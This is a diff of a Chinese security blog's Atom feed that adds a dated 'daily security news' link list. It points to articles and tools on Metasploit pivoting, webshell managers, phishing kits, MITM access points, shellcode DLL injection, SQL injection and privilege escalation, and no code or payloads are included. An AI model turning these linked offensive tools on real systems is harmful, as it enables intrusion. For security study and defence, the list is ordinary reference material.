@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2017-07-29T14:30:11.000Z</updated>
+  <updated>2017-07-31T05:06:19.000Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,69 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>20170731安全动态</title>
+    <link href="http://kevien.github.io/2017/07/31/20170731%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
+    <id>http://kevien.github.io/2017/07/31/20170731安全动态/</id>
+    <published>2017-07-31T02:28:32.000Z</published>
+    <updated>2017-07-31T05:06:19.000Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="每日安全动态"><a href="#每日安全动态" class="headerlink" title="每日安全动态"></a>每日安全动态</h4><ul>
+<li>使用 MSF 路由转发实现MSF框架的内网渗透<br><a href="http://bobao.360.cn/learning/detail/4164.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4164.html</a></li>
+<li>用图形展示堆利用过程<br><a href="http://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/" target="_blank" rel="external">http://veritas501.space/2017/07/25/%E5%9B%BE%E5%BD%A2%E5%8C%96%E5%B1%95%E7%A4%BA%E5%A0%86%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B/</a></li>
+<li>How I Chained 4 vulnerabilities on GitHub Enterprise, From SSRF Execution Chain to RCE!<br><a href="http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html" target="_blank" rel="external">http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html</a></li>
+<li>Petya 内网传播分析<br><a href="&#109;&#97;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x68;&#116;&#116;&#x70;&#x3a;&#x2f;&#x2f;&#x70;&#x75;&#114;&#112;&#x6c;&#101;&#x72;&#111;&#99;&#46;&#99;&#111;&#x6d;&#47;&#77;&#x44;&#47;&#50;&#48;&#x31;&#x37;&#45;&#48;&#x36;&#x2d;&#x32;&#56;&#x40;&#72;&#x6f;&#119;&#x25;&#x32;&#x30;&#x64;&#x6f;&#x65;&#115;&#37;&#x32;&#x30;&#x50;&#x65;&#116;&#121;&#x61;&#37;&#50;&#48;&#115;&#x70;&#x72;&#101;&#x61;&#100;&#x25;&#x32;&#x30;&#x69;&#x6e;&#x25;&#50;&#48;&#76;&#x41;&#x4e;&#x2e;&#x68;&#116;&#x6d;&#108;">&#x68;&#116;&#116;&#x70;&#x3a;&#x2f;&#x2f;&#x70;&#x75;&#114;&#112;&#x6c;&#101;&#x72;&#111;&#99;&#46;&#99;&#111;&#x6d;&#47;&#77;&#x44;&#47;&#50;&#48;&#x31;&#x37;&#45;&#48;&#x36;&#x2d;&#x32;&#56;&#x40;&#72;&#x6f;&#119;&#x25;&#x32;&#x30;&#x64;&#x6f;&#x65;&#115;&#37;&#x32;&#x30;&#x50;&#x65;&#116;&#121;&#x61;&#37;&#50;&#48;&#115;&#x70;&#x72;&#101;&#x61;&#100;&#x25;&#x32;&#x30;&#x69;&#x6e;&#x25;&#50;&#48;&#76;&#x41;&#x4e;&#x2e;&#x68;&#116;&#x6d;&#108;</a></li>
+<li>PROFTPD-1.3.3C后门分析<br><a href="http://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi" target="_blank" rel="external">http://whereisk0shl.top/post/proftpd-1.3.3chou-men-fen-xi</a></li>
+<li>BurpSuite插件：利用BurpSuite Spider收集子域名和相似域名<br><a href="http://www.polaris-lab.com/index.php/archives/349/" target="_blank" rel="external">http://www.polaris-lab.com/index.php/archives/349/</a></li>
+<li><p>Skype-Type：一款keyboard acoustic eavesdropping工具<br><a href="https://github.com/SPRITZ-Research-Group/Skype-Type" target="_blank" rel="external">https://github.com/SPRITZ-Research-Group/Skype-Type</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">通过键盘敲击声来进行键盘监听？</div></pre></td></tr></table></figure>
+</li>
+<li><p>Brida:使用Frida进行移动应用渗透测试<br><a href="https://techblog.mediaservice.net/2017/07/brida-advanced-mobile-application-penetration-testing-with-frida/" target="_blank" rel="external">https://techblog.mediaservice.net/2017/07/brida-advanced-mobile-application-penetration-testing-with-frida/</a></p>
+</li>
+<li>看我如何用20行代码做日志分析<br><a href="https://www.secpulse.com/archives/59608.html" target="_blank" rel="external">https://www.secpulse.com/archives/59608.html</a></li>
+<li>XSStrike：基于Python的XSS测试工具<br><a href="http://www.freebuf.com/sectool/142044.html" target="_blank" rel="external">http://www.freebuf.com/sectool/142044.html</a></li>
+<li>Android安全几道入门题目<br><a href="http://www.freebuf.com/articles/terminal/139451.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/139451.html</a></li>
+<li>sniper：一个开源的 Linux 下基于终端的 Webshell 利用与管理工具<br><a href="http://www.freebuf.com/column/142371.html" target="_blank" rel="external">http://www.freebuf.com/column/142371.html</a></li>
+<li><p>攻击者侵入系统后如何提升账户权限：提权技术详细分析<br><a href="http://www.freebuf.com/news/141335.html" target="_blank" rel="external">http://www.freebuf.com/news/141335.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">这里只是介绍了使用metasploit对windows进行提权的两种方法，还是很不多的</div></pre></td></tr></table></figure>
+</li>
+<li><p>sThisLegit、Phinn：新型开源钓鱼工具<br><a href="https://github.com/duo-labs/isthislegit" target="_blank" rel="external">https://github.com/duo-labs/isthislegit</a></p>
+</li>
+<li>Man-in-the-middle wireless access point inside a docker container 造公共 WiFi 网络执行中间人攻击的 Docker 容器<br><a href="https://github.com/brannondorsey/mitm-router" target="_blank" rel="external">https://github.com/brannondorsey/mitm-router</a></li>
+<li><p>手把手教大家爬取js动态生成的页面<br><a href="http://www.freebuf.com/column/142404.html" target="_blank" rel="external">http://www.freebuf.com/column/142404.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">其实就是利用的selenium</div></pre></td></tr></table></figure>
+</li>
+<li><p>I2C 协议的逆向分析：<br><a href="https://xianzhi.aliyun.com/forum/read/1910.html" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/read/1910.html</a></p>
+</li>
+<li>Blackhat兵器谱新添IOT安全武器<br><a href="http://www.freebuf.com/column/142421.html" target="_blank" rel="external">http://www.freebuf.com/column/142421.html</a></li>
+<li>一个钓鱼木马的分析 （一）<br><a href="http://www.freebuf.com/column/142406.html" target="_blank" rel="external">http://www.freebuf.com/column/142406.html</a></li>
+<li>blackhat之 A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!<br><a href="http://blog.innerht.ml/testing-new-features/" target="_blank" rel="external">http://blog.innerht.ml/testing-new-features/</a></li>
+<li>Friday the 13th: JSON Attacks介绍针对 JSON serializers 和 .NET serializers 的攻击<br><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf" target="_blank" rel="external">https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf</a></li>
+<li><p>如何使用Fuzzing挖掘ImageMagick的漏洞<br><a href="https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="external">https://github.com/lcatro/Fuzzing-ImageMagick/blob/master/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8Fuzzing%E6%8C%96%E6%8E%98ImageMagick%E7%9A%84%E6%BC%8F%E6%B4%9E.md</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">又是一个全栈牛的github</div></pre></td></tr></table></figure>
+</li>
+<li><p>mysql注入可报错时爆表名、字段名、库名<br><a href="http://www.wupco.cn/?p=4117" target="_blank" rel="external">http://www.wupco.cn/?p=4117</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">注入技巧</div></pre></td></tr></table></figure>
+</li>
+<li><p>sRDI - 用 Shellcode 实现的 DLL 反射注入。可以将指定 DLL 文件转换成 Shellcode 输出：<br><a href="https://github.com/monoxgas/sRDI" target="_blank" rel="external">https://github.com/monoxgas/sRDI</a></p>
+</li>
+<li>Revoke-Obfuscation - PowerShell 代码的混淆也开始出现了，来自 FireEye 在 BlackHat 会议的演讲<br><a href="https://www.fireeye.com/blog/threat-research/2017/07/revoke-obfuscation-powershell.html" target="_blank" rel="external">https://www.fireeye.com/blog/threat-research/2017/07/revoke-obfuscation-powershell.html</a><br><a href="https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf" target="_blank" rel="external">https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/revoke-obfuscation-report.pdf</a></li>
+<li>详述MSSQL服务在渗透测试中的利用<br><a href="http://www.freebuf.com/column/142307.html" target="_blank" rel="external">http://www.freebuf.com/column/142307.html</a></li>
+<li>搜狗可以搜索微信的文章,这个也是信息搜集的一个手段。<br><a href="http://weixin.sogou.com/" target="_blank" rel="external">http://weixin.sogou.com/</a></li>
+<li>元数据：黑客最好的朋友<br><a href="http://bobao.360.cn/learning/detail/4161.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4161.html</a><br><a href="http://bobao.360.cn/learning/detail/4162.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/4162.html</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;每日安全动态&quot;&gt;&lt;a href=&quot;#每日安全动态&quot; class=&quot;headerlink&quot; title=&quot;每日安全动态&quot;&gt;&lt;/a&gt;每日安全动态&lt;/h4&gt;&lt;ul&gt;
+&lt;li&gt;使用 MSF 路由转发实现MSF框架的内网渗透&lt;br&gt;&lt;a href=&quot;http://bobao
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>20170728安全动态</title>
@@ -416,7 +479,7 @@
 <li>一篇文章告诉你黑客是如何控制你的人体平衡车的？<br><a href="http://thehackernews.com/2017/07/segway-hoverboard-hacking.html" target="_blank" rel="external">http://thehackernews.com/2017/07/segway-hoverboard-hacking.html</a></li>
 <li>VMware Escape Exploit<br><a href="https://github.com/unamer/vmware_escape" target="_blank" rel="external">https://github.com/unamer/vmware_escape</a></li>
 <li>DropboxC2C：后渗透代理，使用Dropbox Infrastructure进行命令和控制操作<br><a href="https://github.com/0x09AL/DropboxC2C" target="_blank" rel="external">https://github.com/0x09AL/DropboxC2C</a></li>
-<li>postgresql 注入 渗透测试<br><a href="&#x6d;&#97;&#x69;&#x6c;&#116;&#x6f;&#58;&#104;&#116;&#x74;&#x70;&#115;&#x3a;&#47;&#47;&#109;&#101;&#100;&#x69;&#117;&#109;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#112;&#x61;&#110;&#x61;&#103;&#x69;&#x6f;&#x74;&#x69;&#115;&#56;&#x34;&#x2f;&#x61;&#45;&#112;&#x65;&#x6e;&#101;&#x74;&#114;&#x61;&#x74;&#105;&#111;&#x6e;&#x2d;&#116;&#x65;&#x73;&#x74;&#101;&#114;&#x73;&#x2d;&#x67;&#117;&#x69;&#x64;&#101;&#45;&#116;&#111;&#45;&#112;&#x6f;&#115;&#116;&#103;&#x72;&#x65;&#x73;&#113;&#x6c;&#x2d;&#x65;&#48;&#x65;&#x61;&#x66;&#100;&#x31;&#97;&#x31;&#48;&#x32;&#56;">&#104;&#116;&#x74;&#x70;&#115;&#x3a;&#47;&#47;&#109;&#101;&#100;&#x69;&#117;&#109;&#46;&#x63;&#x6f;&#x6d;&#x2f;&#64;&#112;&#x61;&#110;&#x61;&#103;&#x69;&#x6f;&#x74;&#x69;&#115;&#56;&#x34;&#x2f;&#x61;&#45;&#112;&#x65;&#x6e;&#101;&#x74;&#114;&#x61;&#x74;&#105;&#111;&#x6e;&#x2d;&#116;&#x65;&#x73;&#x74;&#101;&#114;&#x73;&#x2d;&#x67;&#117;&#x69;&#x64;&#101;&#45;&#116;&#111;&#45;&#112;&#x6f;&#115;&#116;&#103;&#x72;&#x65;&#x73;&#113;&#x6c;&#x2d;&#x65;&#48;&#x65;&#x61;&#x66;&#100;&#x31;&#97;&#x31;&#48;&#x32;&#56;</a></li>
+<li>postgresql 注入 渗透测试<br><a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x68;&#x74;&#116;&#112;&#x73;&#58;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#46;&#99;&#111;&#109;&#x2f;&#x40;&#112;&#x61;&#110;&#x61;&#x67;&#105;&#x6f;&#x74;&#x69;&#115;&#x38;&#x34;&#47;&#x61;&#45;&#112;&#x65;&#110;&#101;&#116;&#114;&#97;&#x74;&#105;&#x6f;&#x6e;&#45;&#116;&#101;&#115;&#116;&#x65;&#x72;&#115;&#45;&#103;&#117;&#105;&#x64;&#x65;&#45;&#x74;&#x6f;&#45;&#112;&#111;&#115;&#x74;&#103;&#x72;&#101;&#115;&#113;&#108;&#x2d;&#101;&#x30;&#x65;&#97;&#102;&#x64;&#x31;&#97;&#49;&#x30;&#50;&#56;">&#x68;&#x74;&#116;&#112;&#x73;&#58;&#47;&#x2f;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#46;&#99;&#111;&#109;&#x2f;&#x40;&#112;&#x61;&#110;&#x61;&#x67;&#105;&#x6f;&#x74;&#x69;&#115;&#x38;&#x34;&#47;&#x61;&#45;&#112;&#x65;&#110;&#101;&#116;&#114;&#97;&#x74;&#105;&#x6f;&#x6e;&#45;&#116;&#101;&#115;&#116;&#x65;&#x72;&#115;&#45;&#103;&#117;&#105;&#x64;&#x65;&#45;&#x74;&#x6f;&#45;&#112;&#111;&#115;&#x74;&#103;&#x72;&#101;&#115;&#113;&#108;&#x2d;&#101;&#x30;&#x65;&#97;&#102;&#x64;&#x31;&#97;&#49;&#x30;&#50;&#56;</a></li>
 <li><p>新手入门：如何使用Burp进行Web应用漏洞扫描<br><a href="http://www.hackingarticles.in/vulnerability-analysis-web-application-using-burp-scanner/" target="_blank" rel="external">http://www.hackingarticles.in/vulnerability-analysis-web-application-using-burp-scanner/</a></p>
 </li>
 <li><p>script 命令记录ssh操作</p>
@@ -527,7 +590,7 @@
 <li>如何利用 ETERNALROMANCE/SYNERGY 在 Windows Server 2016 上获取 Meterpreter Session<br><a href="https://www.exploit-db.com/docs/42329.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/42329.pdf</a></li>
 <li>基于 James Forshaw 的 Blog，PowerShell-Suite 套件中的一个 UAC Bypass PoC<br><a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1" target="_blank" rel="external">https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/UAC-TokenMagic.ps1</a></li>
 <li>漏洞赏金猎人方法谈<br><a href="https://www.youtube.com/watch?v=C4ZHAdI8o1w" target="_blank" rel="external">https://www.youtube.com/watch?v=C4ZHAdI8o1w</a></li>
-<li>如何高效的进行子域名收集与筛选（以针对Yahoo! 的安全测试为例）<br><a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#x3a;&#104;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#47;&#64;&#119;&#111;&#x6a;&#x5f;&#99;&#x69;&#x65;&#x63;&#104;&#x2f;&#104;&#x6f;&#119;&#45;&#x74;&#x6f;&#x2d;&#102;&#105;&#110;&#x64;&#45;&#x69;&#x6e;&#116;&#101;&#x72;&#x6e;&#x61;&#108;&#45;&#115;&#117;&#x62;&#x64;&#x6f;&#109;&#97;&#x69;&#x6e;&#115;&#45;&#121;&#113;&#x6c;&#x2d;&#121;&#x61;&#x68;&#111;&#111;&#45;&#x61;&#110;&#x64;&#45;&#98;&#x75;&#103;&#x2d;&#x62;&#111;&#117;&#x6e;&#116;&#x79;&#x2d;&#100;&#55;&#x37;&#x33;&#48;&#98;&#x33;&#x37;&#x34;&#x64;&#55;&#x37;">&#104;&#x74;&#x74;&#x70;&#x73;&#x3a;&#x2f;&#47;&#109;&#x65;&#100;&#x69;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#47;&#64;&#119;&#111;&#x6a;&#x5f;&#99;&#x69;&#x65;&#x63;&#104;&#x2f;&#104;&#x6f;&#119;&#45;&#x74;&#x6f;&#x2d;&#102;&#105;&#110;&#x64;&#45;&#x69;&#x6e;&#116;&#101;&#x72;&#x6e;&#x61;&#108;&#45;&#115;&#117;&#x62;&#x64;&#x6f;&#109;&#97;&#x69;&#x6e;&#115;&#45;&#121;&#113;&#x6c;&#x2d;&#121;&#x61;&#x68;&#111;&#111;&#45;&#x61;&#110;&#x64;&#45;&#98;&#x75;&#103;&#x2d;&#x62;&#111;&#117;&#x6e;&#116;&#x79;&#x2d;&#100;&#55;&#x37;&#x33;&#48;&#98;&#x33;&#x37;&#x34;&#x64;&#55;&#x37;</a></li>
+<li>如何高效的进行子域名收集与筛选（以针对Yahoo! 的安全测试为例）<br><a href="&#x6d;&#x61;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#104;&#x74;&#x74;&#112;&#115;&#58;&#x2f;&#47;&#x6d;&#101;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#x2f;&#64;&#x77;&#111;&#x6a;&#x5f;&#99;&#x69;&#x65;&#99;&#x68;&#x2f;&#x68;&#x6f;&#x77;&#x2d;&#x74;&#x6f;&#45;&#102;&#105;&#x6e;&#x64;&#x2d;&#x69;&#110;&#x74;&#x65;&#114;&#x6e;&#97;&#x6c;&#x2d;&#x73;&#117;&#98;&#100;&#111;&#109;&#x61;&#x69;&#110;&#115;&#45;&#121;&#x71;&#x6c;&#45;&#x79;&#x61;&#x68;&#111;&#x6f;&#45;&#x61;&#x6e;&#x64;&#x2d;&#98;&#x75;&#103;&#45;&#98;&#x6f;&#x75;&#110;&#116;&#121;&#x2d;&#100;&#x37;&#55;&#51;&#48;&#x62;&#x33;&#x37;&#x34;&#x64;&#55;&#55;">&#104;&#x74;&#x74;&#112;&#115;&#58;&#x2f;&#47;&#x6d;&#101;&#x64;&#105;&#x75;&#109;&#x2e;&#x63;&#111;&#109;&#x2f;&#64;&#x77;&#111;&#x6a;&#x5f;&#99;&#x69;&#x65;&#99;&#x68;&#x2f;&#x68;&#x6f;&#x77;&#x2d;&#x74;&#x6f;&#45;&#102;&#105;&#x6e;&#x64;&#x2d;&#x69;&#110;&#x74;&#x65;&#114;&#x6e;&#97;&#x6c;&#x2d;&#x73;&#117;&#98;&#100;&#111;&#109;&#x61;&#x69;&#110;&#115;&#45;&#121;&#x71;&#x6c;&#45;&#x79;&#x61;&#x68;&#111;&#x6f;&#45;&#x61;&#x6e;&#x64;&#x2d;&#98;&#x75;&#103;&#45;&#98;&#x6f;&#x75;&#110;&#116;&#121;&#x2d;&#100;&#x37;&#55;&#51;&#48;&#x62;&#x33;&#x37;&#x34;&#x64;&#55;&#55;</a></li>
 <li>yams：模块化安全框架（集成了实用的安全测试脚本及流行的开源项目）<br><a href="https://github.com/leesoh/yams" target="_blank" rel="external">https://github.com/leesoh/yams</a></li>
 <li>一个免费SSL证书的网站<br><a href="https://www.moerats.com/archives/214/" target="_blank" rel="external">https://www.moerats.com/archives/214/</a></li>
 <li>dork-cli – Command-line Google Dork Tool<br><a href="https://www.darknet.org.uk/2017/07/dork-cli-command-line-google-dork-tool/" target="_blank" rel="external">https://www.darknet.org.uk/2017/07/dork-cli-command-line-google-dork-tool/</a></li>
@@ -551,11 +614,12 @@
     <link href="http://kevien.github.io/2017/07/16/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%BA%90%E6%94%B6%E9%9B%86/"/>
     <id>http://kevien.github.io/2017/07/16/机器学习资源收集/</id>
     <published>2017-07-16T08:51:33.000Z</published>
-    <updated>2017-07-28T05:17:42.000Z</updated>
+    <updated>2017-07-31T02:58:58.000Z</updated>
     
     <content type="html"><![CDATA[<h4 id="工具集合"><a href="#工具集合" class="headerlink" title="工具集合"></a>工具集合</h4><ul>
 <li><a href="http://www.hackingtutorials.org/wifi-hacking-tutorials/bypass-mac-filtering-on-wireless-networks/" target="_blank" rel="external">http://www.hackingtutorials.org/wifi-hacking-tutorials/bypass-mac-filtering-on-wireless-networks/</a></li>
 <li>Metasploit for Machine Learning: Deep-Pwning<br><a href="https://n0where.net/metasploit-for-machine-learning-deep-pwning/" target="_blank" rel="external">https://n0where.net/metasploit-for-machine-learning-deep-pwning/</a></li>
+<li>机器学习识别xss<br><a href="https://www.cdxy.me/?p=773" target="_blank" rel="external">https://www.cdxy.me/?p=773</a></li>
 </ul>
 ]]></content>
     
@@ -653,7 +717,7 @@
 <li>Windows NTLM协议存在高危漏洞<br><a href="http://thehackernews.com/2017/07/windows-ntlm-security-flaw.html" target="_blank" rel="external">http://thehackernews.com/2017/07/windows-ntlm-security-flaw.html</a></li>
 <li>构建Python BITS服务器<br><a href="https://safebreach.com/Post/Building-a-Python-BITS-Server" target="_blank" rel="external">https://safebreach.com/Post/Building-a-Python-BITS-Server</a><https: github.com="" safebreach-labs="" simplebitsserver=""></https:></li>
 <li>看着电影电脑怎么就被黑了？给你技术细节分析<br><a href="http://www.4hou.com/info/news/6201.html" target="_blank" rel="external">http://www.4hou.com/info/news/6201.html</a></li>
-<li>解析HaaS（蜜罐即服务）<br><a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#104;&#x74;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#x66;&#x6f;&#x6f;&#115;&#x70;&#105;&#100;&#x79;&#x2f;&#109;&#121;&#x2d;&#x73;&#101;&#x72;&#118;&#x65;&#x72;&#108;&#x65;&#115;&#x73;&#x2d;&#102;&#x72;&#x61;&#110;&#x6b;&#x65;&#x6e;&#x73;&#116;&#x65;&#x69;&#110;&#x2d;&#102;&#111;&#x72;&#45;&#104;&#x6f;&#x6e;&#101;&#x79;&#112;&#111;&#116;&#x73;&#45;&#x65;&#x34;&#52;&#x39;&#x62;&#x36;&#51;&#97;&#x62;&#48;&#101;&#100;">&#104;&#x74;&#x74;&#112;&#115;&#x3a;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#117;&#x6d;&#x2e;&#x63;&#111;&#x6d;&#47;&#64;&#x66;&#x6f;&#x6f;&#115;&#x70;&#105;&#100;&#x79;&#x2f;&#109;&#121;&#x2d;&#x73;&#101;&#x72;&#118;&#x65;&#x72;&#108;&#x65;&#115;&#x73;&#x2d;&#102;&#x72;&#x61;&#110;&#x6b;&#x65;&#x6e;&#x73;&#116;&#x65;&#x69;&#110;&#x2d;&#102;&#111;&#x72;&#45;&#104;&#x6f;&#x6e;&#101;&#x79;&#112;&#111;&#116;&#x73;&#45;&#x65;&#x34;&#52;&#x39;&#x62;&#x36;&#51;&#97;&#x62;&#48;&#101;&#100;</a></li>
+<li>解析HaaS（蜜罐即服务）<br><a href="&#109;&#97;&#x69;&#108;&#116;&#x6f;&#x3a;&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#x2f;&#x40;&#x66;&#111;&#111;&#x73;&#112;&#105;&#x64;&#121;&#x2f;&#109;&#x79;&#45;&#115;&#101;&#x72;&#118;&#101;&#114;&#108;&#x65;&#x73;&#115;&#45;&#x66;&#x72;&#97;&#110;&#x6b;&#101;&#110;&#x73;&#116;&#x65;&#105;&#x6e;&#45;&#102;&#x6f;&#114;&#45;&#x68;&#x6f;&#110;&#x65;&#121;&#112;&#111;&#116;&#x73;&#x2d;&#x65;&#x34;&#52;&#57;&#98;&#x36;&#51;&#97;&#x62;&#48;&#101;&#x64;">&#x68;&#x74;&#x74;&#x70;&#x73;&#x3a;&#47;&#47;&#x6d;&#x65;&#100;&#105;&#x75;&#x6d;&#x2e;&#x63;&#x6f;&#109;&#x2f;&#x40;&#x66;&#111;&#111;&#x73;&#112;&#105;&#x64;&#121;&#x2f;&#109;&#x79;&#45;&#115;&#101;&#x72;&#118;&#101;&#114;&#108;&#x65;&#x73;&#115;&#45;&#x66;&#x72;&#97;&#110;&#x6b;&#101;&#110;&#x73;&#116;&#x65;&#105;&#x6e;&#45;&#102;&#x6f;&#114;&#45;&#x68;&#x6f;&#110;&#x65;&#121;&#112;&#111;&#116;&#x73;&#x2d;&#x65;&#x34;&#52;&#57;&#98;&#x36;&#51;&#97;&#x62;&#48;&#101;&#x64;</a></li>
 <li>htcap：Web应用扫描器<br><a href="https://n0where.net/recursive-web-application-scanner/" target="_blank" rel="external">https://n0where.net/recursive-web-application-scanner/</a></li>
 <li>从hash传递攻击谈相关Windows安全机制<br><a href="http://bobao.360.cn/learning/detail/3793.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3793.html</a></li>
 <li>WebSocket漏洞与防护详解<br><a href="http://bobao.360.cn/learning/detail/3795.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3795.html</a></li>
@@ -706,7 +770,7 @@
 <li>Django源码浅析<br><a href="http://blog.nsfocus.net/%E3%80%90django-source-analyses%E3%80%91-django-command-module/" target="_blank" rel="external">http://blog.nsfocus.net/%E3%80%90django-source-analyses%E3%80%91-django-command-module/</a></li>
 <li>Avanti Markets自动售货机泄露用户数据：使用生物识别的IoT设备离安全有多远？<br><a href="http://www.freebuf.com/news/139948.html" target="_blank" rel="external">http://www.freebuf.com/news/139948.html</a></li>
 <li>你不知道的Chrome开发者工具新功能<br><a href="http://www.freebuf.com/news/139720.html" target="_blank" rel="external">http://www.freebuf.com/news/139720.html</a></li>
-<li>MongoDB 多实例运行在同一主机的安全隐患<br><a href="&#109;&#97;&#105;&#x6c;&#x74;&#x6f;&#x3a;&#104;&#x74;&#116;&#112;&#x73;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#105;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#47;&#x40;&#97;&#108;&#x65;&#x78;&#98;&#121;&#x6b;&#47;&#109;&#111;&#110;&#103;&#111;&#100;&#x62;&#45;&#97;&#x74;&#45;&#115;&#104;&#x61;&#114;&#101;&#100;&#45;&#x68;&#111;&#115;&#116;&#105;&#110;&#103;&#45;&#115;&#101;&#99;&#117;&#x72;&#x69;&#116;&#121;&#45;&#115;&#x75;&#114;&#x70;&#114;&#105;&#x73;&#101;&#115;&#45;&#x63;&#x34;&#52;&#49;&#101;&#x63;&#98;&#x38;&#x34;&#98;&#x35;&#x34;">&#104;&#x74;&#116;&#112;&#x73;&#x3a;&#47;&#47;&#x6d;&#101;&#100;&#105;&#x75;&#109;&#46;&#99;&#x6f;&#109;&#47;&#x40;&#97;&#108;&#x65;&#x78;&#98;&#121;&#x6b;&#47;&#109;&#111;&#110;&#103;&#111;&#100;&#x62;&#45;&#97;&#x74;&#45;&#115;&#104;&#x61;&#114;&#101;&#100;&#45;&#x68;&#111;&#115;&#116;&#105;&#110;&#103;&#45;&#115;&#101;&#99;&#117;&#x72;&#x69;&#116;&#121;&#45;&#115;&#x75;&#114;&#x70;&#114;&#105;&#x73;&#101;&#115;&#45;&#x63;&#x34;&#52;&#49;&#101;&#x63;&#98;&#x38;&#x34;&#98;&#x35;&#x34;</a></li>
+<li>MongoDB 多实例运行在同一主机的安全隐患<br><a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#104;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#99;&#111;&#x6d;&#x2f;&#x40;&#97;&#x6c;&#101;&#x78;&#x62;&#x79;&#107;&#x2f;&#109;&#111;&#110;&#x67;&#111;&#100;&#x62;&#x2d;&#x61;&#116;&#45;&#x73;&#104;&#97;&#114;&#x65;&#100;&#45;&#104;&#x6f;&#x73;&#x74;&#x69;&#110;&#x67;&#x2d;&#x73;&#101;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#45;&#115;&#x75;&#x72;&#112;&#114;&#x69;&#x73;&#101;&#115;&#x2d;&#99;&#x34;&#52;&#x31;&#101;&#99;&#98;&#56;&#52;&#x62;&#53;&#52;">&#104;&#x74;&#x74;&#112;&#115;&#58;&#47;&#47;&#109;&#101;&#x64;&#x69;&#x75;&#109;&#46;&#99;&#111;&#x6d;&#x2f;&#x40;&#97;&#x6c;&#101;&#x78;&#x62;&#x79;&#107;&#x2f;&#109;&#111;&#110;&#x67;&#111;&#100;&#x62;&#x2d;&#x61;&#116;&#45;&#x73;&#104;&#97;&#114;&#x65;&#100;&#45;&#104;&#x6f;&#x73;&#x74;&#x69;&#110;&#x67;&#x2d;&#x73;&#101;&#x63;&#117;&#114;&#x69;&#x74;&#121;&#45;&#115;&#x75;&#x72;&#112;&#114;&#x69;&#x73;&#101;&#115;&#x2d;&#99;&#x34;&#52;&#x31;&#101;&#99;&#98;&#56;&#52;&#x62;&#53;&#52;</a></li>
